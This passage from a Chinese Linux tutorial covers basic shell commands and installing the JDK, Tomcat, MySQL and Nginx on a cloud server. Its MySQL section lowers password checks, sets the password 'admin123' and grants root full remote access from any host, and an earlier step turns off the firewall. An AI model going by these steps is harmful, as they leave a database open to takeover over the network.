class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># 打开目标文件；如果此文件不存在，则表示先创建此文件再打开</span><span class="token attr-name">vi</span> <span class="token attr-value">a.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>当文件打开之后，点击”i”/“a”进入到编辑状态；</li><li>完成编辑之后，点击“esc”退出编辑状态；</li><li>退出文件：<ul><li>:q   如果未对文件进行任何修改—退出文件</li><li>:q!   对文件内容进行了修改，但是不保存退出</li><li>:wq  保存对文件的修改并退出</li></ul></li></ul></li><li><p><code>vim +行号 文件名</code> 进入到当前文件编辑器，光标指向指定的行号</p></li></ul></li><li><p>阅读文件</p><ul><li><code>cat</code>  文件名             阅读文件内容，适合阅读小文件</li><li><code>more</code> 文件名         阅读文件，带有翻页（回车一次往下一行，不支持向上翻页）</li><li><code>less</code> 文件名             阅读文件，适合阅读打文件；可以上下翻页（PgDn/PgUp），退出less阅读模式点击q<ul><li>在less阅读模式下，输入“?查询内容”可以向上查询数据；输入“/查询内容”可以实现向下查询内容</li></ul></li></ul></li><li><p>查询文件和查询内容</p><ul><li><code>find 文件名 </code>               在当前目录查找文件/目录</li><li><code>find 文件名 目录</code>    在指定的目录中查找文件</li><li><code>find -name 文件名</code>    在当前目录包括当前目录子目录中查找文件  </li><li><code>grep -n 内容 文件</code>      在指定的文件中查找指定的内容</li></ul></li><li><p>管道命令</p><ul><li>管道命令：多个命令的组合</li><li>特征：前面的命令必须有输出，后面的命令使用这个输出</li><li>实例：cat a.txt | grep Hello| grep 23</li></ul></li><li><p>删除文件</p><ul><li><code>rm</code> -rf 文件名</li></ul></li><li><p>复制和移动</p><ul><li><code>cp</code> 文件 目录</li><li><code>mv</code> 文件 目录</li></ul></li></ul><h5 id="5-4-3-文件压缩和解压"><a href="#5-4-3-文件压缩和解压" class="headerlink" title="5.4.3 文件压缩和解压"></a>5.4.3 文件压缩和解压</h5><ul><li><p>windows系统下压缩文件通常是zip、rar等格式；Linux系统压缩文件通常为tar.gz(tar包)</p></li><li><p>tar 指令 完成linux系统的文件压缩和解压</p><ul><li><p><code>tar -zcvf</code> 压缩</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># 对test1目录进行压缩，压缩到test1.tar文件</span><span class="token attr-name">tar</span> <span class="token attr-value">-zcvf test1.tar test1</span><span class="token comment"># 将test1和test2进行压缩，压缩到test.tar文件</span><span class="token attr-name">tar</span> <span class="token attr-value">-zcvf test.tar test1 test2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>tar -zxvf</code> 解压</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># 解压指定的压缩文件</span><span class="token attr-name">tar</span> <span class="token attr-value">-zxvf test.tar</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>指令说明：</p><ul><li>z   用gzip工具进行压缩或者解压</li><li>x extract 解压缩</li><li>c compress 压缩</li><li>v verbose显示压缩/解压过程详细信息</li><li>f file 文件</li></ul></li></ul><h4 id="5-5-用户及权限管理"><a href="#5-5-用户及权限管理" class="headerlink" title="5.5 用户及权限管理"></a>5.5 用户及权限管理</h4><blockquote><p>Linux系统支持多用户，采用用户组的形式管理多个用户（root用户就在root用户组）</p><p><img src="imgs/1620888417050.png" alt="1620888417050"></p></blockquote><blockquote><p>在Linux中提供了严格的权限管理（用户对文件/目录的操作权限，root用户默认具有所有文件的操作权限）</p><p>对文件的操作权限：读、写、执行</p></blockquote><ul><li><p>用户组</p><ul><li><code>groupadd</code> team1   创建用户组</li><li><code>groupdel</code> team1     删除用户组</li></ul></li><li><p>用户</p><ul><li><code>useradd</code> -g 用户组 用户名     创建新用户</li><li><code>passwd</code> 用户名                        设置用户密码</li><li><code>userdel</code> 用户名                         删除用户</li></ul></li><li><p>切换用户</p><ul><li><code>su</code> 用户名                              切换至其他普通用户</li><li><code>su</code>                                          切换至管理员（需要输入超级管理员密码）</li></ul></li><li><p>权限管理</p><table><thead><tr><th><img src="imgs%5Cimage-20200414164516525.png" alt="image-20200414164516525"></th></tr></thead><tbody><tr><td></td></tr></tbody></table><ul><li>说明：<ul><li>第一个字符表示文件|目录  ，d表示目录，-表示文件</li><li>r 可读(4)    w可写(2)    x 可执行(1)</li><li>第一个rwx：表示当前文件的所有者拥有的权限</li><li>第二个rwx：表示和文件所有者同组用户拥有的权限</li><li>第三个rwx：表示不同组用户拥有的权限</li></ul></li><li>修改权限 <code>chmod</code>  <ul><li>chmod 775 文件名</li></ul></li></ul></li></ul><h4 id="5-6-系统与进程"><a href="#5-6-系统与进程" class="headerlink" title="5.6 系统与进程"></a>5.6 系统与进程</h4><ul><li><p>查询进程<code>top</code></p></li><li><p><code>ps -ef | grep java</code>    通过进程名称查找进程</p></li><li><p>根据端口查找进程</p><ul><li><code>lsof -i:port</code>    通过端口查询进程信息  <ul><li>如果此指令不可以用，则需要通过 <code>yum install -y lsof</code>安装指令</li><li>CentOS6  Ubuntu没有此指令</li></ul></li><li><code>netstat -apn | grep port</code>    通过端口查询进程信息 （CentOS6）</li></ul></li><li><p>强杀进程</p><ul><li><code>kill -9 PID</code>  通过进程编号强杀进程</li></ul></li><li><p>系统注销和重启</p><ul><li>logout   注销</li><li>reboot   重启</li></ul></li></ul><h2 id="六、软件管理相关的指令（wget，-rpm，yum）"><a href="#六、软件管理相关的指令（wget，-rpm，yum）" class="headerlink" title="六、软件管理相关的指令（wget，  rpm，yum）"></a>六、软件管理相关的指令（wget，  rpm，yum）</h2><h4 id="6-1-wget指令"><a href="#6-1-wget指令" class="headerlink" title="6.1 wget指令"></a>6.1 wget指令</h4><blockquote><p>我们在linux中安装软件，首先要完成软件安装包的下载；获取Linux系统中软件的安装包，我们有两种途径：</p><ul><li>在windows中进行下载（百度搜索—下载），通过xftp将windows现在的安装包上传到Linux系统</li><li>直接在linux系统中，通过wget进行下载</li></ul></blockquote><h5 id="6-1-1-wget介绍"><a href="#6-1-1-wget介绍" class="headerlink" title="6.1.1 wget介绍"></a>6.1.1 wget介绍</h5><ul><li>wget是Linux系统中一个下载文件的工具，Linux系统自带</li></ul><h5 id="6-1-2-wget使用"><a href="#6-1-2-wget使用" class="headerlink" title="6.1.2 wget使用"></a>6.1.2 wget使用</h5><ul><li><code>wget [option] url</code></li><li>mysql 下载： wget <a href="http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm">http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</a></li></ul><h4 id="6-2-rpm指令"><a href="#6-2-rpm指令" class="headerlink" title="6.2 rpm指令"></a>6.2 rpm指令</h4><h5 id="6-2-1-rpm介绍"><a href="#6-2-1-rpm介绍" class="headerlink" title="6.2.1 rpm介绍"></a>6.2.1 rpm介绍</h5><p>RPM(Red-Hat Package Manager) 是一款Linux系统的软件包的管理器，可以完成Linux系统中应用的安装、卸载</p><h5 id="6-2-2-rpm指令"><a href="#6-2-2-rpm指令" class="headerlink" title="6.2.2 rpm指令"></a>6.2.2 rpm指令</h5><ul><li><p>查询：<code>rpm -qa | grep 关键字     </code></p></li><li><p>卸载：<code>rpm -e --nodeps 软件名称</code></p></li><li><p>安装：<code>rpm -ivh 安装包.rpm </code></p><ul><li>mysql安装: rpm -ivh mysql57-community-release-el7-10.noarch.rpm</li></ul></li><li><p>更新：<code>rpm -Uvh</code> 安装包.rpm</p></li></ul><h4 id="6-3-yum指令"><a href="#6-3-yum指令" class="headerlink" title="6.3 yum指令"></a>6.3 yum指令</h4><h5 id="6-3-1-yum介绍"><a href="#6-3-1-yum介绍" class="headerlink" title="6.3.1 yum介绍"></a>6.3.1 yum介绍</h5><blockquote><p>yum(全称：Yellow Dog Updater，Modified)，基于RPM包管理，能够从指定的服务器自动下载rpm并安装，可以自定处理依赖关系，一次安装所有的依赖软件，无需一个个的下载安装。</p></blockquote><h5 id="6-3-2-yum指令"><a href="#6-3-2-yum指令" class="headerlink" title="6.3.2 yum指令"></a>6.3.2 yum指令</h5><ul><li><code>yum [-y] install</code> <a href="http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm">http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</a></li><li><code>yum list</code>   yum list  列出系统中所有的包</li><li><code>yum [-y] install rpm包</code>    下载并安装rpm包</li><li><code>yum update rpm包</code></li><li><code>yum remove rpm包</code></li></ul><h2 id="七、JDK安装（离线安装）"><a href="#七、JDK安装（离线安装）" class="headerlink" title="七、JDK安装（离线安装）"></a>七、JDK安装（离线安装）</h2><h4 id="7-1-下载JDK（Linux版）"><a href="#7-1-下载JDK（Linux版）" class="headerlink" title="7.1 下载JDK（Linux版）"></a>7.1 下载JDK（Linux版）</h4><p>官网/云盘    （jdk.tar.gz）</p><h4 id="7-2-使用xftp将下载的安装包上传到linux的-usr-local目录"><a href="#7-2-使用xftp将下载的安装包上传到linux的-usr-local目录" class="headerlink" title="7.2 使用xftp将下载的安装包上传到linux的/usr/local目录"></a>7.2 使用xftp将下载的安装包上传到linux的/usr/local目录</h4><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs%5Cimage-20200415110145262.png" alt="image-20200415110145262"></td></tr></tbody></table><h4 id="7-3-解压JDK安装包"><a href="#7-3-解压JDK安装包" class="headerlink" title="7.3 解压JDK安装包"></a>7.3 解压JDK安装包</h4><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs%5Cimage-20200415110612822.png" alt="image-20200415110612822"></td></tr></tbody></table><h4 id="7-4-查看JDK工具"><a href="#7-4-查看JDK工具" class="headerlink" title="7.4 查看JDK工具"></a>7.4 查看JDK工具</h4><table><thead><tr><th>JDK目录结构</th></tr></thead><tbody><tr><td><img src="imgs%5Cimage-20200415110915002.png" alt="image-20200415110915002"></td></tr></tbody></table><h4 id="7-5-配置环境变量"><a href="#7-5-配置环境变量" class="headerlink" title="7.5 配置环境变量"></a>7.5 配置环境变量</h4><ul><li><p>进入到/etc目录，找到profile文件</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs%5Cimage-20200415111230427.png" alt="image-20200415111739734"></td></tr></tbody></table></li><li><p>编辑profile文件 ：  vim profile</p><ul><li>在profile文件最后配置以下内容</li></ul><pre class="line-numbers language-PRO" data-language="PRO"><code class="language-PRO">export JAVA_HOME=/usr/local/jdk1.8.0_221export JRE_HOME=$JAVA_HOME/jreexport CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/libexport PATH=$JAVA_HOME/bin:$PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="7-6-让配置生效"><a href="#7-6-让配置生效" class="headerlink" title="7.6 让配置生效"></a>7.6 让配置生效</h4><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># 让配置生效</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">etc]# source /etc/profile</span><span class="token comment"># 显示jdk版本</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">etc]# java -version</span><span class="token attr-name">java</span> <span class="token attr-value">version "1.8.0_221"</span><span class="token attr-name">Java(TM)</span> <span class="token attr-value">SE Runtime Environment (build 1.8.0_221-b11)</span><span class="token attr-name">Java</span> <span class="token attr-value">HotSpot(TM) 64-Bit Server VM (build 25.221-b11, mixed mode)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="八、Tomcat安装"><a href="#八、Tomcat安装" class="headerlink" title="八、Tomcat安装"></a>八、Tomcat安装</h2><h4 id="8-1-下载离线tar"><a href="#8-1-下载离线tar" class="headerlink" title="8.1 下载离线tar"></a>8.1 下载离线tar</h4><p>略</p><h4 id="8-2-上传到Linux"><a href="#8-2-上传到Linux" class="headerlink" title="8.2 上传到Linux"></a>8.2 上传到Linux</h4><p>略</p><h4 id="8-3-解压tar文件"><a href="#8-3-解压tar文件" class="headerlink" title="8.3 解压tar文件"></a>8.3 解压tar文件</h4><pre class="line-numbers language-none"><code class="language-none">tar -zxvf apache-tomcat-8.5.46.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-4-启动tomcat"><a href="#8-4-启动tomcat" class="headerlink" title="8.4 启动tomcat"></a>8.4 启动tomcat</h4><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">apache-tomcat-8.5.46]# cd /usr/local/apache-tomcat-8.5.46/bin</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">bin]# ls</span><span class="token attr-name">bootstrap.jar</span> <span class="token attr-value"> catalina-tasks.xml  commons-daemon.jar            configtest.sh  digest.sh         shutdown.bat  startup.sh            tool-wrapper.bat  version.sh</span><span class="token attr-name">catalina.bat</span> <span class="token attr-value">  ciphers.bat         commons-daemon-native.tar.gz  daemon.sh      setclasspath.bat  shutdown.sh   tomcat-juli.jar       tool-wrapper.sh</span><span class="token attr-name">catalina.sh</span> <span class="token attr-value">   ciphers.sh          configtest.bat                digest.bat     setclasspath.sh   startup.bat   tomcat-native.tar.gz  version.bat</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">bin]# ./startup.sh</span><span class="token attr-name">Using</span> <span class="token attr-value">CATALINA_BASE:   /usr/local/apache-tomcat-8.5.46</span><span class="token attr-name">Using</span> <span class="token attr-value">CATALINA_HOME:   /usr/local/apache-tomcat-8.5.46</span><span class="token attr-name">Using</span> <span class="token attr-value">CATALINA_TMPDIR: /usr/local/apache-tomcat-8.5.46/temp</span><span class="token attr-name">Using</span> <span class="token attr-value">JRE_HOME:        /usr/local/jdk1.8.0_221/jre</span><span class="token attr-name">Using</span> <span class="token attr-value">CLASSPATH:       /usr/local/apache-tomcat-8.5.46/bin/bootstrap.jar:/usr/local/apache-tomcat-8.5.46/bin/tomcat-juli.jar</span><span class="token attr-name">Tomcat</span> <span class="token attr-value">started.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-5-关闭防火墙"><a href="#8-5-关闭防火墙" class="headerlink" title="8.5 关闭防火墙"></a>8.5 关闭防火墙</h4><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># 查看防火墙状态</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">bin]# systemctl status firewalld</span><span class="token attr-name">●</span> <span class="token attr-value">firewalld.service - firewalld - dynamic firewall daemon</span><span class="token attr-name">   Loaded</span><span class="token punctuation">:</span> <span class="token attr-value">loaded (/usr/lib/systemd/system/firewalld.service; disabled; vendor preset: enabled)</span><span class="token attr-name">   Active</span><span class="token punctuation">:</span> <span class="token attr-value">inactive (dead)</span><span class="token attr-name">     Docs</span><span class="token punctuation">:</span> <span class="token attr-value">man:firewalld(1)</span><span class="token comment"># 关闭防火墙</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">bin]# systemctl stop firewalld</span><span class="token comment"># 启动防火墙</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">bin]# systemctl start firewalld</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-6-访问云主机上的tomcat"><a href="#8-6-访问云主机上的tomcat" class="headerlink" title="8.6 访问云主机上的tomcat"></a>8.6 访问云主机上的tomcat</h4><ul><li>安全组设置：要让tomcat的端口允许访问</li><li><a href="http://47.96.11.185:8080/">http://47.96.11.185:8080/</a></li></ul><h4 id="8-7-停止tomcat"><a href="#8-7-停止tomcat" class="headerlink" title="8.7 停止tomcat"></a>8.7 停止tomcat</h4><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">bin]# lsof -i:8080</span><span class="token attr-name">COMMAND</span> <span class="token attr-value">  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><span class="token attr-name">java</span> <span class="token attr-value">   30394 root   53u  IPv4  64248      0t0  TCP *:webcache (LISTEN)</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">bin]# kill -9 30394</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="九、安装MySQL"><a href="#九、安装MySQL" class="headerlink" title="九、安装MySQL"></a>九、安装MySQL</h2><h4 id="9-1-在线安装（推荐）"><a href="#9-1-在线安装（推荐）" class="headerlink" title="9.1 在线安装（推荐）"></a>9.1 在线安装（推荐）</h4><h5 id="9-1-1-通过wget指令下载mysql的rpm文件"><a href="#9-1-1-通过wget指令下载mysql的rpm文件" class="headerlink" title="9.1.1 通过wget指令下载mysql的rpm文件"></a>9.1.1 通过wget指令下载mysql的rpm文件</h5><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# pwd</span>/usr/local<span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# ls</span><span class="token attr-name">aegis</span> <span class="token attr-value"> apache-tomcat-8.5.46  bin  etc  games  include  jdk1.8.0_221  lib  lib64  libexec  sbin  share  src</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# wget http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="9-1-2-rpm安装mysql"><a href="#9-1-2-rpm安装mysql" class="headerlink" title="9.1.2 rpm安装mysql"></a>9.1.2 rpm安装mysql</h5><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# rpm -ivh mysql57-community-release-el7-10.noarch.rpm</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="9-1-3-通过yum安装mysql服务"><a href="#9-1-3-通过yum安装mysql服务" class="headerlink" title="9.1.3 通过yum安装mysql服务"></a>9.1.3 通过yum安装mysql服务</h5><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# yum -y install mysql-community-server</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="9-1-4-加入开机启动"><a href="#9-1-4-加入开机启动" class="headerlink" title="9.1.4 加入开机启动"></a>9.1.4 加入开机启动</h5><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# systemctl enable mysqld</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="9-1-5-启动MySQL服务"><a href="#9-1-5-启动MySQL服务" class="headerlink" title="9.1.5 启动MySQL服务"></a>9.1.5 启动MySQL服务</h5><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# systemctl start mysqld                </span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# lsof -i:3306</span><span class="token attr-name">COMMAND</span> <span class="token attr-value"> PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><span class="token attr-name">mysqld</span> <span class="token attr-value"> 8430 mysql   17u  IPv6  70095      0t0  TCP *:mysql (LISTEN)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>或者使用： service mysqld start</li></ul><h5 id="5-1-5-停止MySQL服务"><a href="#5-1-5-停止MySQL服务" class="headerlink" title="5.1.5 停止MySQL服务"></a>5.1.5 停止MySQL服务</h5><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# systemctl stop mysqld</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>或者使用：service mysqld stop</li></ul><h4 id="9-2-离线下载安装"><a href="#9-2-离线下载安装" class="headerlink" title="9.2 离线下载安装"></a>9.2 离线下载安装</h4><h5 id="9-2-1-在windows下载mysql安装文件（2个）"><a href="#9-2-1-在windows下载mysql安装文件（2个）" class="headerlink" title="9.2.1 在windows下载mysql安装文件（2个）"></a>9.2.1 在windows下载mysql安装文件（2个）</h5><pre class="line-numbers language-none"><code class="language-none">MySQL-server-5.6.45-1.el7.x86_64.rpmMySQL-client-5.6.45-1.el7.x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="9-2-2-将安装包上传到linux-usr-local"><a href="#9-2-2-将安装包上传到linux-usr-local" class="headerlink" title="9.2.2 将安装包上传到linux(/usr/local)"></a>9.2.2 将安装包上传到linux(/usr/local)</h5><p> xftp</p><h5 id="9-2-3-清除centos自带的mariaDB包"><a href="#9-2-3-清除centos自带的mariaDB包" class="headerlink" title="9.2.3 清除centos自带的mariaDB包"></a>9.2.3 清除centos自带的mariaDB包</h5><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# rpm -qa | grep mariadb</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# rpm -e --nodeps mariadb-libs-...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="9-2-4-安装mysql的服务和客户端"><a href="#9-2-4-安装mysql的服务和客户端" class="headerlink" title="9.2.4 安装mysql的服务和客户端"></a>9.2.4 安装mysql的服务和客户端</h5><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]#rpm -ivh MySQL-server-5.6.45-1.el7.x86_64.rpm</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]#rpm -ivh MySQL-client-5.6.45-1.el7.x86_64.rpm</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="9-3-MySQL基本使用"><a href="#9-3-MySQL基本使用" class="headerlink" title="9.3 MySQL基本使用"></a>9.3 MySQL基本使用</h4><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># 1.查找初始密码</span><span class="token attr-name">cat</span> <span class="token attr-value">/var/log/mysqld.log | grep password</span><span class="token comment"># 2.登录到mysql</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">log]# mysql -uroot -p</span><span class="token attr-name">Enter</span> <span class="token attr-value">password: </span><span class="token comment"># 3.修改密码</span><span class="token comment"># 3-1 设置密码的检查机制为LOW</span><span class="token attr-name">set</span> <span class="token attr-value">global validate_password_policy=LOW</span><span class="token comment"># 3-2 修改密码</span><span class="token attr-name">set</span> <span class="token attr-value">password=password('admin123');</span><span class="token comment"># 4.授权远程登录</span><span class="token attr-name">GRANT</span> <span class="token attr-value">ALL PRIVILEGES on *.* to 'root'@'%' IDENTIFIED by 'admin123' WITH GRANT OPTION;</span><span class="token attr-name">flush</span> <span class="token attr-value">PRIVILEGES;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十、安装Nginx（在线安装）"><a href="#十、安装Nginx（在线安装）" class="headerlink" title="十、安装Nginx（在线安装）"></a>十、安装Nginx（在线安装）</h2><h4 id="10-1-安装编译工具（nginx安装之前需要编译）"><a href="#10-1-安装编译工具（nginx安装之前需要编译）" class="headerlink" title="10.1 安装编译工具（nginx安装之前需要编译）"></a>10.1 安装编译工具（nginx安装之前需要编译）</h4><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# yum install -y gcc gcc-c++</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-2-安装PCRE"><a href="#10-2-安装PCRE" class="headerlink" title="10.2 安装PCRE"></a>10.2 安装PCRE</h4><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># 1.下载</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# wget http://downloads.sourceforge.net/project/pcre/pcre/8.35/pcre-8.35.tar.gz</span><span class="token comment"># 2.解压</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# tar -zxvf pcre-8.35.tar.gz</span><span class="token comment"># 3.进入pcre目录</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# cd pcre-8.35</span><span class="token comment"># 4.配置</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">pcre-8.35]#./configure</span><span class="token comment"># 5.编译安装</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">pcre-8.35]# make &amp;&amp; make install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10-3-安装SSL库"><a href="#10-3-安装SSL库" class="headerlink" title="10.3 安装SSL库"></a>10.3 安装SSL库</h4><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">pcre-8.35]# cd /usr/local</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# wget http://www.openssl.org/source/openssl-1.0.1j.tar.gz</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# tar -zxvf openssl-1.0.1j.tar.gz</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# cd openssl-1.0.1j</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">openssl-1.0.1j]# ./config</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">openssl-1.0.1j]# make &amp;&amp; make install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10-4-安装zlib库"><a href="#10-4-安装zlib库" class="headerlink" title="10.4 安装zlib库"></a>10.4 安装zlib库</h4><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">openssl-1.0.1j]# cd /usr/local</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# wget http://zlib.net/zlib-1.2.11.tar.gz</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# tar -zxvf zlib-1.2.11.tar.gz </span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# cd zlib-1.2.11</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">zlib-1.2.11]# ./configure</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">zlib-1.2.11]# make &amp;&amp; make install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10-5-安装Nginx"><a href="#10-5-安装Nginx" class="headerlink" title="10.5 安装Nginx"></a>10.5 安装Nginx</h4><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token attr-name">[root@theo</span> <span class="token attr-value">zlib-1.2.11]# cd /usr/local</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# wget http://nginx.org/download/nginx-1.16.1.tar.gz</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# tar -zxvf nginx-1.16.1.tar.gz</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# mkdir -p server/nginx</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">local]# cd nginx-1.16.1</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">nginx-1.16.1]# ./configure --prefix=/usr/local/server/nginx --with-http_stub_status_module --with-http_ssl_module --with-pcre=/usr/local/pcre-8.35</span><span class="token attr-name">[root@theo</span> <span class="token attr-value">nginx-1.16.1]# make &amp;&amp; make install</span><span class="token comment"># 如果在配置过程中出现了以下错误:</span><span class="token attr-name">./configure</span><span class="token punctuation">:</span> <span class="token attr-value">error: SSL modules require the OpenSSL library.</span><span class="token attr-name">You</span> <span class="token attr-value">can either do not enable the modules, or install the OpenSSL library</span><span class="token attr-name">into</span> <span class="token attr-value">the system, or build the OpenSSL library statically from the source</span><span class="token attr-name">with</span> <span class="token attr-value">nginx by using --with-openssl=&lt;path&gt; option.</span><span class="token comment"># 执行：yum -y install openssl openssl-devel</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10-6-配置Nginx"><a href="#10-6-配置Nginx" class="headerlink" title="10.6 配置Nginx"></a>10.6 配置Nginx</h4><ul><li>vim /usr/local/server/nginx/conf/nginx.conf</li></ul><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs%5Cimage-20200415165705521.png" alt="image-20200415165705521"></td></tr></tbody></table><h4 id="10-7-启动Nginx"><a href="#10-7-启动Nginx" class="headerlink" title="10.7 启动Nginx"></a>10.7 启动Nginx</h4><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs%5Cimage-20200415170046112.png" alt="image-20200415170046112"></td></tr></tbody></table><h4 id="10-8-访问Nginx"><a href="#10-8-访问Nginx" class="headerlink" title="10.8 访问Nginx"></a>10.8 访问Nginx</h4><p><a href="http://47.96.11.185/imgs/a.jpg">http://47.96.11.185/imgs/a.jpg</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue</title>
      <link href="/posts/12.html"/>
      <url>/posts/12.html</url>
      
